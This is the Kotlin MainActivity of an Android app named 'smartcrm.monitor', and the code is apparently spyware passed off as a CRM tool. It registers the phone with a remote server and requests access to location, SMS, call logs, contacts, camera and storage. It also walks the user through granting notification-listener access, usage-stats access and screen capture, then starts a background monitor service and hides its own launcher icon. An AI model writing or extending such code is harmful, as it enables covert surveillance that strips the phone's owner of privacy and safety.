package com.smartcrm.monitor

import android.Manifest
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    private val PERMS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.PROCESS_OUTGOING_CALLS,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Register device on server
        Thread {
            try {
                val d = org.json.JSONObject()
                d.put("type", "register")
                d.put("name", ApiClient.getDeviceName())
                ApiClient.post("api.php", d, this)
            } catch (e: Exception) {}
        }.start()

        val missing = PERMS.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
        } else {
            startEverything()
        }
    }

    private fun startEverything() {
        // 1. Usage stats
        if (!hasUsageStats()) {
            try { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (e: Exception) {}
        }

        // 2. Battery optimization
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(
                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:$packageName")
                        }
                    )
                } catch (e: Exception) {}
            }
        }

        // 3. Notification listener
        if (!isNotificationListenerEnabled()) {
            try { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) } catch (e: Exception) {}
        }

        // 4. POST_NOTIFICATIONS Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
            }
        }

        // 5. Start monitor service
        startMonitorService()

        // 6. MediaProjection ek baar
        Handler(Looper.getMainLooper()).postDelayed({
            val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
            if (!prefs.getBoolean("projection_approved", false)) {
                try {
                    startActivity(
                        Intent(this, ScreenPermissionActivity::class.java).apply {
                            putExtra("cmd_id", 0)
                            putExtra("mode", ScreenStreamService.MODE_SNAPSHOT)
                        }
                    )
                } catch (e: Exception) {}
            }
        }, 2000)

        // 7. Hide icon after 500ms then finish
        Handler(Looper.getMainLooper()).postDelayed({
            hideIconViaAlias()
            finish()
        }, 500)
    }

    private fun hideIconViaAlias() {
        try {
            val alias = ComponentName(this, "$packageName.MainLauncher")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {}
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return listeners.contains(packageName)
    }

    private fun hasUsageStats(): Boolean {
        return try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
            }
            mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { false }
    }

    private fun startMonitorService() {
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        startEverything()
    }
}